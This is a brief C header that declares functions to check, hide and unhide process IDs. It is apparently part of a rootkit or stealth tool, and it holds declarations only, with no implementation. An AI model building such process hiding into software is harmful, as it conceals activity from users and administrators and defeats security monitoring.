#ifndef __HIDE_TASK
#define __HIDE_TASK

int is_pid_hidden(pid_t);
int is_pid_hidden_no_getpid(pid_t);
void hide_pid(pid_t);
void unhide_pid(pid_t);

#endif
